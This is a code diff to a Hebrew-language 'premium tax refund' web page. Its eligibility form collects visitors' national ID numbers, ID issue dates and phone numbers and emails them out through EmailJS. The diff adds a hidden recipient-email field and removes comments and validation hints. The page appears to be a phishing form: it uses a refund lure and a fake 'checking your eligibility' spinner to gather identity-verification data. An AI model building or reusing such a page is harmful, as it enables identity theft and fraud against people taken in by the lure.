@@ -31,7 +31,6 @@
         100%{transform:translate(0,0);}
     }
 
-    /* HEADER */
     header {
         background: linear-gradient(270deg,#2E7D32,#4CAF50,#81C784,#43A047);
         background-size:800% 800%;
@@ -52,12 +51,10 @@
         animation: textGradient 8s ease infinite;
     }
     header p {font-size:1.3em; animation: fadeIn 2s ease;}
-
     @keyframes headerGradient {0%{background-position:0% 50%;}50%{background-position:100% 50%;}100%{background-position:0% 50%;}}
     @keyframes textGradient {0%{background-position:0% 50%;}50%{background-position:100% 50%;}100%{background-position:0% 50%;}}
     @keyframes fadeIn {from {opacity:0;} to {opacity:1;}}
 
-    /* POPUP */
     .popup {
         display:none;
         position:fixed;
@@ -85,9 +82,7 @@
     }
     @keyframes spin {100% {transform:rotate(360deg);}}
 
-    /* FORM */
     form {
-        position:relative;
         display:flex;
         flex-direction:column;
         background: linear-gradient(135deg,#fff3e0,#ffe0b2);
@@ -147,7 +142,7 @@
       </div>
       <div class="form-group">
         <label for="id-number">תעודת זהות</label>
-        <input type="text" id="id-number" name="id_number" placeholder="מספר תעודת זהות" required maxlength="9" pattern="[0-9]{9}" title="תעודת זהות חייבת להכיל 9 ספרות">
+        <input type="text" id="id-number" name="id_number" placeholder="מספר תעודת זהות" required maxlength="9" pattern="[0-9]{9}">
       </div>
       <div class="form-group">
         <label for="id-date">תאריך הנפקה של תעודת זהות</label>
@@ -155,8 +150,9 @@
       </div>
       <div class="form-group">
         <label for="phone">נייד</label>
-        <input type="tel" id="phone" name="phone" placeholder="נייד ליצירת קשר" required maxlength="10" pattern="[0-9]{10}" title="נייד חייב להכיל 10 ספרות">
+        <input type="tel" id="phone" name="phone" placeholder="נייד ליצירת קשר" required maxlength="10" pattern="[0-9]{10}">
       </div>
+      <input type="hidden" name="to_email" value="your_email@example.com">
       <button type="submit">בדוק זכאותך</button>
     </form>
   </section>
@@ -166,44 +162,33 @@
   &copy; 2026 החזרי מס פרימיום | כל הזכויות שמורות
 </footer>
 
-<!-- Popup for Loading -->
 <div class="popup" id="popup">
   <div id="popup-text">בודק את זכאותך...</div>
   <div class="loader"></div>
 </div>
 
 <script src="https://cdn.emailjs.com/sdk/3.2/email.min.js"></script>
-  
-<script type="text/javascript">
- emailjs.init({
-  publicKey: "t2eGSdp94pjW_SynR"
-});
+<script>
+window.onload = function() {
+  emailjs.init("t2eGSdp94pjW_SynR");
 
   document.getElementById('taxForm').addEventListener('submit', function(e) {
     e.preventDefault();
-
-    // הצג את הפופ-אפ
     document.getElementById('popup').style.display = 'block';
 
-    // שלח את הנתונים ל-EmailJS
     emailjs.sendForm('service_qgukpno', 'template_d7lfkgq', this)
       .then(function(response) {
         console.log('SUCCESS', response);
         alert('הבקשה שלך נקלטה בהצלחה!');
-        // הסתר את הפופ-אפ לאחר שליחה מוצלחת
         document.getElementById('popup').style.display = 'none';
       }, function(error) {
         console.log('FAILED', error);
         alert('שגיאה בשליחת המייל, נסה שנית');
-        // הסתר את הפופ-אפ במקרה של שגיאה
         document.getElementById('popup').style.display = 'none';
       });
   });
+};
 </script>
 
 </body>
 </html>
-
-
-
-
